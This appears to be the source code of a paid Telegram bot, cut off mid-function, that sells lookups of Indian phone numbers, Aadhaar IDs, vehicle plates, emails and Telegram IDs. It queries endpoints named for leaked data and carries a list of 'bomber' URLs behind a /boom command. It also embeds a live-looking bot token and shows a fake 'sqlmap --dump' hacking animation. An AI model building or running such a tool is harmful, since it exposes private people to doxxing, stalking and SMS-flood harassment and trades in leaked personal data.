import telebot, requests, re, sqlite3, datetime, json, os, time, threading, uuid
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# ==================== CONFIG ====================
BOT_TOKEN = "8622116851:AAG6kEKsxsDithf4ea85nZ9X4v2ia3ueJwc"
ADMIN_ID = 6936978343

ANSH_API_URL = "https://anshapi.pages.dev/api/num"
ANSH_API_KEY = "ansh"

SARKARI_NUM_API_URL       = "https://sarkariupdate.online/osint/APIX.php?api=api_0a8091"
SARKARI_AADHAAR_API_URL   = "https://sarkariupdate.online/osint/APIX.php?api=aadharinfo"
SARKARI_LEAK_API_URL      = "https://sarkariupdate.online/osint/APIX.php?api=leak_osint"
SARKARI_VEHICLE_API_URL   = "https://sarkariupdate.online/osint/APIX.php?api=api_379373"
SARKARI_V2N_API_URL       = "https://sarkariupdate.online/osint/APIX.php?api=vehicle_to_num"
DARK_SPECIAL_API_URL      = "https://bot.userinfo.site/apixadmin/DarkApiX.php?api=api_fad768"
TG_NUMBER_API_URL         = "https://sarkariupdate.online/osint/APIX.php?api=api_6182a6"
AADHAAR_SPECIAL_API_URL   = "https://sarkariupdate.online/osint/APIX.php?api=api_e5ba5c"
PAKISTAN_API_URL          = "https://sarkariupdate.online/osint/APIX.php?api=api_9bfe12"
VEHICLE_SPECIAL_API_URL   = "https://reseller-host.vercel.app/api/rc"

BOMBER_URLS = [f'https://getofferpro.xyz/bomber{i if i>1 else ""}/index.php' for i in range(1, 12)]

OWNER = "@Cyber_With_Ranjan"
WEBSITE = "https://cyberwithranjan.in"
GROUP = "https://t.me/cyberwithranjan"
CHANNEL = "https://t.me/cyberwithranjan"
UPI_ID = "desi.hacker@ybl"

QR_PATH = os.path.join(os.path.dirname(__file__), 'qr.png')

# ---- Session with pooling ----
SESSION = requests.Session()
SESSION.headers.update({'User-Agent': 'Mozilla/5.0 (Linux; Android 10)'})
_adapter = requests.adapters.HTTPAdapter(pool_connections=30, pool_maxsize=60, max_retries=1)
SESSION.mount('https://', _adapter)
SESSION.mount('http://', _adapter)

# ---- Bot ----
bot = telebot.TeleBot(BOT_TOKEN, parse_mode='Markdown')

# ---- DB (thread-safe lock) ----
_db_lock = threading.RLock()
conn = sqlite3.connect('users.db', check_same_thread=False)
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS users (
    user_id INTEGER PRIMARY KEY,
    username TEXT, first_name TEXT,
    lang TEXT DEFAULT 'en',
    coins INTEGER DEFAULT 0,
    last_claim TEXT,
    access INTEGER DEFAULT 0,
    premium INTEGER DEFAULT 0,
    premium_expiry TEXT,
    searches INTEGER DEFAULT 0,
    insta_followed INTEGER DEFAULT 0,
    website_visited INTEGER DEFAULT 0
)''')
conn.commit()

BOMBER_STATE = {}
BOMBER_LOCK = threading.Lock()

# Query cache for callback_data (64-byte limit fix)
_QUERY_CACHE = {}
_QUERY_CACHE_LOCK = threading.Lock()
_QUERY_CACHE_MAX = 500

def cache_query(q, flags):
    """Returns a short token to store query+flags for callback_data."""
    token = uuid.uuid4().hex[:10]
    with _QUERY_CACHE_LOCK:
        if len(_QUERY_CACHE) > _QUERY_CACHE_MAX:
            # drop oldest ~100
            for k in list(_QUERY_CACHE.keys())[:100]:
                _QUERY_CACHE.pop(k, None)
        _QUERY_CACHE[token] = (q, flags)
    return token

def get_cached_query(token):
    with _QUERY_CACHE_LOCK:
        return _QUERY_CACHE.get(token)

# ==================== LANGUAGES ====================
L = {
    'en': {'lang': "🌐 **Select Language:**", 'welcome': "🎁 **Welcome to OSINT Bot!**\n\n🪙 **FREE Daily Coin**\n• Claim 1 coin every day\n• 1 Coin = 1 Search\n\n💎 **Premium Plans**\n• 1 Day – ₹10\n• 1 Week – ₹60\n• 1 Month – ₹101\n\n📸 Scan QR to buy premium\n👇 Or claim FREE coin now!", 'claim_btn': "🎁 FREE Daily Coin Claim", 'buy_premium': "💳 Buy Premium", 'already_claimed': "✅ Aaj ka coin already claim kar chuke ho!\n\n⏰ Kal phir aana", 'coin_claimed': "🎉 **Congratulations!**\n\n🪙 You got 1 FREE Coin!\n🪙 Total Coins: {coins}\n\n✅ Now you can search!", 'main_menu': "📱 **Main Menu**", 'search': "🔍 Search", 'premium': "💎 Premium", 'number': "📱 Number", 'vehicle': "🚗 Vehicle", 'vehicle_special': "🚘 Vehicle Spl", 'aadhaar': "🆔 Aadhaar", 'profile_btn': "👤 Profile", 'help_btn': "❓ Help", 'about_btn': "ℹ️ About", 'clear_btn': "🗑️ Clear", 'back': "🔙 Back", 'owner': "👨‍💻 Owner", 'admin_only': "⚠️ Not authorized.", 'enter_number': "📱 Send 10-digit number:", 'enter_vehicle': "🚗 Send vehicle number:", 'enter_vehicle_special': "🚘 Send vehicle for Special:", 'enter_aadhaar': "🆔 Send 12-digit Aadhaar:", 'enter_special': "🔍 Send number for Special lookup:", 'enter_aadhaar_special': "🆔 Send 12-digit Aadhaar for Special:", 'enter_tg_number': "📞 Send Telegram ID:", 'enter_pakistan': "🇵🇰 Send Pakistan number (03XXXXXXXXX):", 'enter_leak_number': "🔎 Send number for Leak OSINT lookup:", 'enter_leak_email': "📧 Send email for Leak OSINT lookup:", 'enter_v2n': "🚘 Send vehicle number for Vehicle→Number:", 'help': "📖 /start /menu /num /normal /special /vehicle /vehiclespecial /aadhaar /aadharspecial /tgnumber /pakistan /leaknumber /leakemail /vehicletonum /boom /claim /premium /profile /contact /clear /language /website /myid", 'profile': "👤 **Profile**\n\n🆔 ID: `{uid}`\n🪙 Coins: **{coins}**\n💎 Premium: {prem}\n🔍 Searches: {searches}", 'about': "🤖 OSINT v3.0\n👨‍💻 @Cyber_With_Ranjan", 'nc': "❌ No coins! Claim daily 1 FREE coin.", 'stats_text': "📊 Stats\n👥 Total: {total}\n💎 Premium: {premium}\n🪙 Coins: {coins}\n🔍 Searches: {searches}"},
    'hi': {'lang': "🌐 **भाषा चुनें:**", 'welcome': "🎁 **OSINT Bot में स्वागत!**\n\n🪙 **FREE Daily Coin**\n• रोज 1 FREE Coin claim करें\n• 1 Coin = 1 Search\n\n💎 **प्रीमियम प्लान**\n• 1 दिन – ₹10\n• 1 सप्ताह – ₹60\n• 1 महीना – ₹101\n\n📸 QR स्कैन करके premium खरीदें\n👇 या अभी FREE coin claim करें!", 'claim_btn': "🎁 FREE Daily Coin Claim", 'buy_premium': "💳 प्रीमियम खरीदें", 'already_claimed': "✅ आज का coin already claim कर चुके हो!\n\n⏰ कल फिर आना", 'coin_claimed': "🎉 **बधाई हो!**\n\n🪙 आपको 1 FREE Coin मिला!\n🪙 Total Coins: {coins}\n\n✅ अब search कर सकते हैं!", 'main_menu': "📱 **मुख्य मेनू**", 'search': "🔍 खोज", 'premium': "💎 प्रीमियम", 'number': "📱 नंबर", 'vehicle': "🚗 वाहन", 'vehicle_special': "🚘 वाहन Spl", 'aadhaar': "🆔 आधार", 'profile_btn': "👤 प्रोफाइल", 'help_btn': "❓ मदद", 'about_btn': "ℹ️ जानकारी", 'clear_btn': "🗑️ साफ करें", 'back': "🔙 वापस", 'owner': "👨‍💻 मालिक", 'admin_only': "⚠️ अधिकृत नहीं।", 'enter_number': "📱 10 अंकों का नंबर भेजें:", 'enter_vehicle': "🚗 वाहन नंबर भेजें:", 'enter_vehicle_special': "🚘 Special वाहन:", 'enter_aadhaar': "🆔 12 अंकों का आधार:", 'enter_special': "🔍 Special के लिए number भेजें:", 'enter_aadhaar_special': "🆔 12-digit Aadhaar for Special:", 'enter_tg_number': "📞 Telegram ID भेजें:", 'enter_pakistan': "🇵🇰 Pakistan number (03XXXXXXXXX):", 'enter_leak_number': "🔎 Leak OSINT के लिए number भेजें:", 'enter_leak_email': "📧 Leak OSINT के लिए email भेजें:", 'enter_v2n': "🚘 Vehicle→Number के लिए vehicle number भेजें:", 'help': "📖 /start /menu /num /normal /special /vehicle /vehiclespecial /aadhaar /aadharspecial /tgnumber /pakistan /leaknumber /leakemail /vehicletonum /boom /claim /premium /profile /contact /clear /language /website /myid", 'profile': "👤 **प्रोफाइल**\n\n🆔 ID: `{uid}`\n🪙 Coins: **{coins}**\n💎 प्रीमियम: {prem}\n🔍 खोज: {searches}", 'about': "🤖 OSINT v3.0\n👨‍💻 @Cyber_With_Ranjan", 'nc': "❌ Coin नहीं! रोज 1 FREE coin claim करें।", 'stats_text': "📊 आँकड़े\n👥 कुल: {total}\n💎 प्रीमियम: {premium}\n🪙 Coins: {coins}\n🔍 खोज: {searches}"},
    'bn': {'lang': "🌐 **ভাষা নির্বাচন:**", 'welcome': "🎁 **OSINT Bot এ স্বাগতম!**\n\n🪙 **FREE Daily Coin**\n• প্রতিদিন ১টি FREE Coin\n• ১ Coin = ১ Search\n\n💎 **প্রিমিয়াম প্ল্যান**\n• ১ দিন – ₹১০\n• ১ সপ্তাহ – ₹৬০\n• ১ মাস – ₹১০১\n\n📸 QR স্ক্যান করুন\n👇 অথবা FREE coin claim করুন!", 'claim_btn': "🎁 FREE Daily Coin Claim", 'buy_premium': "💳 প্রিমিয়াম কিনুন", 'already_claimed': "✅ আজকের coin claim হয়েছেন!\n\n⏰ কাল আবার আসুন", 'coin_claimed': "🎉 **অভিনন্দন!**\n\n🪙 ১টি FREE Coin পেয়েছেন!\n🪙 Total: {coins}\n\n✅ এখন search করুন!", 'main_menu': "📱 **মেনু**", 'search': "🔍 অনুসন্ধান", 'premium': "💎 প্রিমিয়াম", 'number': "📱 নম্বর", 'vehicle': "🚗 গাড়ি", 'vehicle_special': "🚘 গাড়ি Spl", 'aadhaar': "🆔 আধার", 'profile_btn': "👤 প্রোফাইল", 'help_btn': "❓ সাহায্য", 'about_btn': "ℹ️ তথ্য", 'clear_btn': "🗑️ মুছুন", 'back': "🔙 ফিরে", 'owner': "👨‍💻 মালিক", 'admin_only': "⚠️ অনুমতি নেই।", 'enter_number': "📱 ১০ অঙ্কের নম্বর:", 'enter_vehicle': "🚗 গাড়ির নম্বর:", 'enter_vehicle_special': "🚘 স্পেশাল গাড়ি:", 'enter_aadhaar': "🆔 ১২ অঙ্কের আধার:", 'enter_special': "🔍 Special নম্বর:", 'enter_aadhaar_special': "🆔 ১২ অঙ্কের আধার Special:", 'enter_tg_number': "📞 Telegram ID:", 'enter_pakistan': "🇵🇰 Pakistan number (03XXXXXXXXX):", 'enter_leak_number': "🔎 Leak OSINT নম্বর:", 'enter_leak_email': "📧 Leak OSINT ইমেইল:", 'enter_v2n': "🚘 Vehicle→Number:", 'help': "📖 /start /menu /num /normal /special /vehicle /vehiclespecial /aadhaar /aadharspecial /tgnumber /pakistan /leaknumber /leakemail /vehicletonum /boom /claim /premium /profile /contact /clear /language /website /myid", 'profile': "👤 **প্রোফাইল**\n\n🆔 `{uid}`\n🪙 Coins: **{coins}**\n💎 প্রিমিয়াম: {prem}\n🔍 অনুসন্ধান: {searches}", 'about': "🤖 OSINT v3.0\n👨‍💻 @Cyber_With_Ranjan", 'nc': "❌ Coin নেই! দৈনিক ১ FREE coin নিন।", 'stats_text': "📊 পরিসংখ্যান\n👥 মোট: {total}\n💎 প্রিমিয়াম: {premium}\n🪙 Coins: {coins}\n🔍 অনুসন্ধান: {searches}"},
    'mr': {'lang': "🌐 **भाषा निवडा:**", 'welcome': "🎁 **OSINT Bot मध्ये स्वागत!**\n\n🪙 **FREE Daily Coin**\n• रोज १ FREE Coin\n• १ Coin = १ Search\n\n💎 **प्रीमियम प्लान**\n• १ दिवस – ₹१०\n• १ आठवडा – ₹६०\n• १ महिना – ₹१०१\n\n📸 QR स्कॅन करा\n👇 किंवा FREE coin claim करा!", 'claim_btn': "🎁 FREE Daily Coin Claim", 'buy_premium': "💳 प्रीमियम खरेदी", 'already_claimed': "✅ आजचा coin claim केला!\n\n⏰ उद्या या", 'coin_claimed': "🎉 **अभिनंदन!**\n\n🪙 १ FREE Coin मिळाला!\n🪙 Total: {coins}\n\n✅ आता search करा!", 'main_menu': "📱 **मुख्य मेनू**", 'search': "🔍 शोध", 'premium': "💎 प्रीमियम", 'number': "📱 क्रमांक", 'vehicle': "🚗 वाहन", 'vehicle_special': "🚘 वाहन Spl", 'aadhaar': "🆔 आधार", 'profile_btn': "👤 प्रोफाइल", 'help_btn': "❓ मदत", 'about_btn': "ℹ️ माहिती", 'clear_btn': "🗑️ साफ करा", 'back': "🔙 मागे", 'owner': "👨‍💻 मालक", 'admin_only': "⚠️ अधिकार नाही.", 'enter_number': "📱 १० अंकी क्रमांक:", 'enter_vehicle': "🚗 वाहन क्रमांक:", 'enter_vehicle_special': "🚘 स्पेशल वाहन:", 'enter_aadhaar': "🆔 १२ अंकी आधार:", 'enter_special': "🔍 Special क्रमांक:", 'enter_aadhaar_special': "🆔 १२ अंकी आधार Special:", 'enter_tg_number': "📞 Telegram ID:", 'enter_pakistan': "🇵🇰 Pakistan number (03XXXXXXXXX):", 'enter_leak_number': "🔎 Leak OSINT क्रमांक:", 'enter_leak_email': "📧 Leak OSINT ईमेल:", 'enter_v2n': "🚘 Vehicle→Number:", 'help': "📖 /start /menu /num /normal /special /vehicle /vehiclespecial /aadhaar /aadharspecial /tgnumber /pakistan /leaknumber /leakemail /vehicletonum /boom /claim /premium /profile /contact /clear /language /website /myid", 'profile': "👤 **प्रोफाइल**\n\n🆔 `{uid}`\n🪙 Coins: **{coins}**\n💎 प्रीमियम: {prem}\n🔍 शोध: {searches}", 'about': "🤖 OSINT v3.0\n👨‍💻 @Cyber_With_Ranjan", 'nc': "❌ Coin नाही! रोज १ FREE coin.", 'stats_text': "📊 आकडेवारी\n👥 एकूण: {total}\n💎 प्रीमियम: {premium}\n🪙 Coins: {coins}\n🔍 शोध: {searches}"},
    'ur': {'lang': "🌐 **زبان منتخب:**", 'welcome': "🎁 **OSINT Bot میں خوش آمدید!**\n\n🪙 **FREE Daily Coin**\n• روزانہ ۱ FREE Coin\n• ۱ Coin = ۱ Search\n\n💎 **پریمیم پلان**\n• ۱ دن – ₹۱۰\n• ۱ ہفتہ – ₹۶۰\n• ۱ مہینہ – ₹۱۰۱\n\n📸 QR اسکین کریں\n👇 یا FREE coin claim کریں!", 'claim_btn': "🎁 FREE Daily Coin Claim", 'buy_premium': "💳 پریمیم خریدیں", 'already_claimed': "✅ آج کا coin claim کر چکے!\n\n⏰ کل آئیں", 'coin_claimed': "🎉 **مبارک ہو!**\n\n🪙 ۱ FREE Coin ملا!\n🪙 Total: {coins}\n\n✅ اب search کریں!", 'main_menu': "📱 **مین مینو**", 'search': "🔍 تلاش", 'premium': "💎 پریمیم", 'number': "📱 نمبر", 'vehicle': "🚗 گاڑی", 'vehicle_special': "🚘 گاڑی Spl", 'aadhaar': "🆔 آدھار", 'profile_btn': "👤 پروفائل", 'help_btn': "❓ مدد", 'about_btn': "ℹ️ معلومات", 'clear_btn': "🗑️ صاف", 'back': "🔙 واپس", 'owner': "👨‍💻 مالک", 'admin_only': "⚠️ مجاز نہیں۔", 'enter_number': "📱 ۱۰ ہندسی نمبر:", 'enter_vehicle': "🚗 گاڑی نمبر:", 'enter_vehicle_special': "🚘 سپیشل گاڑی:", 'enter_aadhaar': "🆔 ۱۲ ہندسی آدھار:", 'enter_special': "🔍 Special نمبر:", 'enter_aadhaar_special': "🆔 ۱۲ ہندسی آدھار Special:", 'enter_tg_number': "📞 Telegram ID:", 'enter_pakistan': "🇵🇰 Pakistan number (03XXXXXXXXX):", 'enter_leak_number': "🔎 Leak OSINT نمبر:", 'enter_leak_email': "📧 Leak OSINT ای میل:", 'enter_v2n': "🚘 Vehicle→Number:", 'help': "📖 /start /menu /num /normal /special /vehicle /vehiclespecial /aadhaar /aadharspecial /tgnumber /pakistan /leaknumber /leakemail /vehicletonum /boom /claim /premium /profile /contact /clear /language /website /myid", 'profile': "👤 **پروفائل**\n\n🆔 `{uid}`\n🪙 Coins: **{coins}**\n💎 پریمیم: {prem}\n🔍 تلاش: {searches}", 'about': "🤖 OSINT v3.0\n👨‍💻 @Cyber_With_Ranjan", 'nc': "❌ Coin نہیں! روزانہ ۱ FREE coin.", 'stats_text': "📊 اعداد\n👥 کل: {total}\n💎 پریمیم: {premium}\n🪙 Coins: {coins}\n🔍 تلاش: {searches}"},
    'ta': {'lang': "🌐 **மொழி தேர்வு:**", 'welcome': "🎁 **OSINT Bot க்கு வரவேற்கிறோம்!**\n\n🪙 **FREE Daily Coin**\n• தினமும் 1 FREE Coin\n• 1 Coin = 1 Search\n\n💎 **பிரீமியம் திட்டம்**\n• 1 நாள் – ₹10\n• 1 வாரம் – ₹60\n• 1 மாதம் – ₹101\n\n📸 QR ஸ்கேன் செய்யவும்\n👇 அல்லது FREE coin claim!", 'claim_btn': "🎁 FREE Daily Coin Claim", 'buy_premium': "💳 பிரீமியம் வாங்க", 'already_claimed': "✅ இன்றைய coin claim!\n\n⏰ நாளை வாருங்கள்", 'coin_claimed': "🎉 **வாழ்த்துக்கள்!**\n\n🪙 1 FREE Coin!\n🪙 Total: {coins}\n\n✅ Search செய்யுங்கள்!", 'main_menu': "📱 **மெனு**", 'search': "🔍 தேடு", 'premium': "💎 பிரீமியம்", 'number': "📱 எண்", 'vehicle': "🚗 வாகனம்", 'vehicle_special': "🚘 வாகனம் Spl", 'aadhaar': "🆔 ஆதார்", 'profile_btn': "👤 சுயவிவரம்", 'help_btn': "❓ உதவி", 'about_btn': "ℹ️ தகவல்", 'clear_btn': "🗑️ அழி", 'back': "🔙 பின்", 'owner': "👨‍💻 உரிமை", 'admin_only': "⚠️ அனுமதி இல்லை.", 'enter_number': "📱 10 இலக்க எண்:", 'enter_vehicle': "🚗 வாகன எண்:", 'enter_vehicle_special': "🚘 ஸ்பெஷல் வாகனம்:", 'enter_aadhaar': "🆔 12 இலக்க ஆதார்:", 'enter_special': "🔍 Special எண்:", 'enter_aadhaar_special': "🆔 12 இலக்க ஆதார் Special:", 'enter_tg_number': "📞 Telegram ID:", 'enter_pakistan': "🇵🇰 Pakistan number (03XXXXXXXXX):", 'enter_leak_number': "🔎 Leak OSINT எண்:", 'enter_leak_email': "📧 Leak OSINT மின்னஞ்சல்:", 'enter_v2n': "🚘 Vehicle→Number:", 'help': "📖 /start /menu /num /normal /special /vehicle /vehiclespecial /aadhaar /aadharspecial /tgnumber /pakistan /leaknumber /leakemail /vehicletonum /boom /claim /premium /profile /contact /clear /language /website /myid", 'profile': "👤 **சுயவிவரம்**\n\n🆔 `{uid}`\n🪙 Coins: **{coins}**\n💎 பிரீமியம்: {prem}\n🔍 தேடல்: {searches}", 'about': "🤖 OSINT v3.0\n👨‍💻 @Cyber_With_Ranjan", 'nc': "❌ Coin இல்லை! தினமும் 1 FREE coin.", 'stats_text': "📊 புள்ளி\n👥 மொத்தம்: {total}\n💎 பிரீமியம்: {premium}\n🪙 Coins: {coins}\n🔍 தேடல்: {searches}"}
}

# ==================== MARKDOWN SAFETY HELPERS ====================
def V(s):
    """Sanitize a value for use inside a Markdown backtick block.
    Removes backticks and newlines so the block doesn't break."""
    if s is None: return 'N/A'
    s = str(s).replace('`', "'").replace('\r', ' ').replace('\n', ' ')
    s = re.sub(r'\s+', ' ', s).strip()
    return s if s else 'N/A'

def M(s):
    """Sanitize a value for use OUTSIDE backticks in Markdown (legacy).
    Removes chars that break Markdown parsing."""
    if s is None: return ''
    s = str(s)
    for ch in ['_', '*', '`', '[', ']']:
        s = s.replace(ch, '')
    return s

def safe_send(chat_id, text, **kwargs):
    """Send a message, truncating if too long and retrying without parse_mode on failure."""
    if len(text) > 4000:
        text = text[:3950] + "\n...(truncated)"
    try:
        return bot.send_message(chat_id, text, **kwargs)
    except Exception:
        try:
            kw = dict(kwargs); kw.pop('parse_mode', None)
            return bot.send_message(chat_id, text, **kw)
        except Exception:
            return None

def safe_edit(chat_id, msg_id, text, **kwargs):
    """Edit a message, truncating if too long and retrying without parse_mode on failure."""
    if len(text) > 4000:
        text = text[:3950] + "\n...(truncated)"
    try:
        return bot.edit_message_text(text, chat_id, msg_id, **kwargs)
    except Exception:
        try:
            kw = dict(kwargs); kw.pop('parse_mode', None)
            return bot.edit_message_text(text, chat_id, msg_id, **kw)
        except Exception:
            return None

def safe_reply(m, text, **kwargs):
    if len(text) > 4000:
        text = text[:3950] + "\n...(truncated)"
    try:
        return bot.reply_to(m, text, **kwargs)
    except Exception:
        try:
            kw = dict(kwargs); kw.pop('parse_mode', None)
            return bot.reply_to(m, text, **kw)
        except Exception:
            return None

# ==================== HELPERS ====================
_lang_cache = {}
_lang_lock = threading.Lock()

def gl(i):
    with _lang_lock:
        if i in _lang_cache: return _lang_cache[i]
    try:
        with _db_lock:
            c.execute("SELECT lang FROM users WHERE user_id=?", (i,)); r = c.fetchone()
        v = r[0] if r else 'en'
    except Exception:
        v = 'en'
    with _lang_lock:
        _lang_cache[i] = v
    return v

def sl(i, l):
    with _lang_lock:
        _lang_cache[i] = l
    try:
        with _db_lock:
            c.execute("UPDATE users SET lang=? WHERE user_id=?", (l, i)); conn.commit()
    except Exception: pass

def ensure_user(i, name="User", un=""):
    try:
        with _db_lock:
            c.execute("INSERT OR IGNORE INTO users (user_id, first_name, username) VALUES (?, ?, ?)", (i, name, un))
            conn.commit()
    except Exception: pass

def au(i, n, u=""): ensure_user(i, n, u)

def gc(i):
    try:
        with _db_lock:
            c.execute("SELECT coins FROM users WHERE user_id=?", (i,)); r = c.fetchone()
        return r[0] if r else 0
    except Exception: return 0

def dc(i):
    try:
        if ip(i):
            with _db_lock:
                c.execute("UPDATE users SET searches=searches+1 WHERE user_id=?", (i,)); conn.commit()
            return True
        coins = gc(i)
        if coins <= 0: return False
        with _db_lock:
            c.execute("UPDATE users SET coins=coins-1, searches=searches+1 WHERE user_id=?", (i,)); conn.commit()
        return True
    except Exception: return False

def claim_daily_coin(i):
    try:
        ensure_user(i)
        t = datetime.datetime.now().date().isoformat()
        with _db_lock:
            c.execute("SELECT last_claim FROM users WHERE user_id=?", (i,)); r = c.fetchone()
            if r and r[0] == t: return False
            c.execute("UPDATE users SET coins=coins+1, last_claim=?, access=1 WHERE user_id=?", (t, i))
            conn.commit()
        return True
    except Exception: return False

_prem_cache = {}
_prem_cache_time = {}
_prem_lock = threading.Lock()

def ip(i):
    if i == ADMIN_ID: return True
    now = time.time()
    with _prem_lock:
        if i in _prem_cache and now - _prem_cache_time.get(i, 0) < 60:
            return _prem_cache[i]
    try:
        with _db_lock:
            c.execute("SELECT premium, premium_expiry FROM users WHERE user_id=?", (i,)); r = c.fetchone()
        if not r or r[0] == 0:
            with _prem_lock:
                _prem_cache[i] = False; _prem_cache_time[i] = now
            return False
        if r[1]:
            try:
                if datetime.datetime.fromisoformat(r[1]) > datetime.datetime.now():
                    with _prem_lock:
                        _prem_cache[i] = True; _prem_cache_time[i] = now
                    return True
            except Exception:
                with _prem_lock:
                    _prem_cache[i] = True; _prem_cache_time[i] = now
                return True
            with _db_lock:
                c.execute("UPDATE users SET premium=0, premium_expiry=NULL WHERE user_id=?", (i,)); conn.commit()
            with _prem_lock:
                _prem_cache[i] = False; _prem_cache_time[i] = now
            return False
        with _prem_lock:
            _prem_cache[i] = True; _prem_cache_time[i] = now
        return True
    except Exception:
        return False

def ap(i, d=30):
    try:
        ensure_user(i, "Admin_Added")
        e = (datetime.datetime.now() + datetime.timedelta(days=d)).isoformat()
        with _db_lock:
            c.execute("UPDATE users SET premium=1, premium_expiry=?, access=1 WHERE user_id=?", (e, i))
            conn.commit()
        with _prem_lock:
            _prem_cache.pop(i, None)
        return True
    except Exception: return False

def add_coins_db(i, coins):
    try:
        ensure_user(i, "Admin_Added")
        with _db_lock:
            c.execute("UPDATE users SET coins=coins+? WHERE user_id=?", (coins, i)); conn.commit()
        return gc(i)
    except Exception: return 0

def get_total_searches():
    try:
        with _db_lock:
            c.execute("SELECT SUM(searches) FROM users"); r = c.fetchone()
        return r[0] if r and r[0] else 0
    except Exception: return 0

# ==================== HACKER LOADING ====================
def hacker_loading(chat_id, msg_id, query, search_type='NUMBER'):
    qsafe = V(query)[:40]
    frames = [
        (55, "⚡", "SCANNING DB",     "sqlmap --dump"),
        (100, "✅", "ACCESS GRANTED", "root@hacker:~$ SUCCESS")
    ]
    for percent, icon, status, cmd in frames:
        filled = percent // 10
        bar = "🟩" * filled + "⬛" * (10 - filled)
        try:
            bot.edit_message_text(
                f"`🟢 HACKER TERMINAL v3.0`\n"
                f"`━━━━━━━━━━━━━━━━━━━━━━━`\n"
                f"{bar} `{percent}%`\n"
                f"`{icon} {status}`\n"
                f"`$ {cmd}`\n"
                f"`🎯 TARGET : {qsafe}`\n"
                f"`📡 METHOD : {search_type}`",
                chat_id, msg_id, parse_mode='Markdown'
            )
            time.sleep(0.06)
        except Exception: pass

# ==================== API FUNCTIONS ====================
def _clean_digits(s):
    return re.sub(r'\D', '', str(s or ''))

def _safe_json(r):
    try:
        return r.json()
    except Exception:
        try:
            return json.loads(r.text)
        except Exception:
            return None

def fetch_ansh_number(num):
    try:
        clean = _clean_digits(num)
        r = SESSION.get(f"{ANSH_API_URL}?key={ANSH_API_KEY}&num={clean}", timeout=10)
        if r.status_code == 200: return _safe_json(r)
        return None
    except Exception: return None

def fetch_sarkari_num(num):
    try:
        clean = _clean_digits(num)
        r = SESSION.get(f"{SARKARI_NUM_API_URL}&q={clean}", timeout=10)
        if r.status_code == 200: return _safe_json(r)
        return None
    except Exception: return None

def fetch_sarkari_aadhaar(aadhaar_num):
    try:
        clean = _clean_digits(aadhaar_num)
        r = SESSION.get(f"{SARKARI_AADHAAR_API_URL}&q={clean}", timeout=10)
        if r.status_code == 200: return _safe_json(r)
        return None
    except Exception: return None

def fetch_leak_osint(query):
    try:
        q = str(query).strip()
        r = SESSION.get(f"{SARKARI_LEAK_API_URL}&q={q}", timeout=12)
        if r.status_code == 200: return _safe_json(r)
        return None
    except Exception: return None

def fetch_sarkari_vehicle(vehicle_num):
    try:
        r = SESSION.get(f"{SARKARI_VEHICLE_API_URL}&q={vehicle_num.upper()}", timeout=10)
        if r.status_code == 200: return _safe_json(r)
        return None
    except Exception: return None

def fetch_vehicle_to_num(vehicle_num):
    try:
        r = SESSION.get(f"{SARKARI_V2N_API_URL}&q={vehicle_num.upper()}", timeout=10)
        if r.status_code == 200: return _safe_json(r)
        return None
    except Exception: return None

def fetch_special(phone):
    try:
        clean = _clean_digits(phone)
        r = SESSION.get(f"{DARK_SPECIAL_API_URL}&q={clean}", timeout=9)
        if r.status_code == 200: return _safe_json(r)
        return None
    except Exception: return None

def fetch_tg_number(tg_id):
    try:
        r = SESSION.get(f"{TG_NUMBER_API_URL}&q={tg_id}", timeout=9)
        if r.status_code == 200: return _safe_json(r)
        return None
    except Exception: return None

def fetch_aadhaar_special(aadhaar_num):
    try:
        r = SESSION.get(f"{AADHAAR_SPECIAL_API_URL}&q={aadhaar_num}", timeout=9)
        if r.status_code == 200: return _safe_json(r)
        return None
    except Exception: return None

def fetch_pakistan(pk_num):
    try:
        r = SESSION.get(f"{PAKISTAN_API_URL}&q={pk_num}", timeout=9)
        if r.status_code == 200: return _safe_json(r)
        return None
    except Exception: return None

def fetch_vehicle_special(vehicle_num):
    try:
        r = SESSION.get(f"{VEHICLE_SPECIAL_API_URL}?number={vehicle_num.upper()}", timeout=9)
        if r.status_code == 200: return _safe_json(r)
        return None
    except Exception: return None

# ==================== FORMAT RESULT ====================
def _get_ci(d, *keys, default='N/A'):
    """Case-insensitive key lookup."""
    if not isinstance(d, dict): return default
    lower = {str(k).lower(): k for k in d.keys()}
    for k in keys:
        lk = str(k).lower()
        if lk in lower:
            v = d.get(lower[lk])
            if v is not None and str(v).strip() and str(v).strip().lower() != 'null':
                return v
    return default

def _find_records(data):
    """Try to extract a list of record dicts from various response shapes."""
    if isinstance(data, list):
        return [r for r in data if isinstance(r, dict)]
    if not isinstance(data, dict):
        return []
    for key in ['data', 'Data', 'result', 'Result', 'records', 'Records', 'results', 'Results', 'Main_Records', 'main_records']:
        v = data.get(key)
        if isinstance(v, list):
            return [r for r in v if isinstance(r, dict)]
        if isinstance(v, dict):
            for k2 in ['records', 'Records', 'results', 'Results', 'data', 'Data', 'Main_Records', 'main_records']:
                v2 = v.get(k2)
                if isinstance(v2, list):
                    return [r for r in v2 if isinstance(r, dict)]
    # Single record?
    if any(data.get(k) for k in ['name','Name','mobile','phone','email','address','fname']):
        return [data]
    return []

def _records_to_text(records, query, label, max_records=3):
    if not records:
        return f"`❌ No records found`\n`🔎 Query: {V(query)}`"
    text = f"`🔎 {label}`\n`━━━━━━━━━━━━━━━━━━━━━`\n`🎯 Query: {V(query)}`\n`📊 Total: {len(records)}`\n"
    for i, rec in enumerate(records[:max_records], 1):
        text += f"\n`📌 Record #{i}`\n"
        shown = 0
        for k, v in rec.items():
            if shown >= 12: break
            if v is None: continue
            sv = str(v).strip()
            if not sv or sv.lower() == 'null': continue
            # Skip dicts/lists (nested)
            if isinstance(v, (dict, list)): continue
            label_k = str(k).replace('_', ' ').title()[:20]
            text += f"`  • {label_k}: {V(sv)[:100]}`\n"
            shown += 1
    if len(records) > max_records:
        text += f"\n`... and {len(records)-max_records} more`"
    text += f"`🔐 {OWNER}`"
    return text

def format_result(data, query, **flags):
    is_vehicle            = flags.get('is_vehicle', False)
    is_special            = flags.get('is_special', False)
    is_aadhaar            = flags.get('is_aadhaar', False)
    is_number_special     = flags.get('is_number_special', False)
    is_aadhaar_special    = flags.get('is_aadhaar_special', False)
    is_tg_number          = flags.get('is_tg_number', False)
    is_pakistan           = flags.get('is_pakistan', False)
    is_ansh               = flags.get('is_ansh', False)
    is_sarkari_num        = flags.get('is_sarkari_num', False)
    is_sarkari_aadhaar    = flags.get('is_sarkari_aadhaar', False)
    is_leak_number        = flags.get('is_leak_number', False)
    is_leak_email         = flags.get('is_leak_email', False)
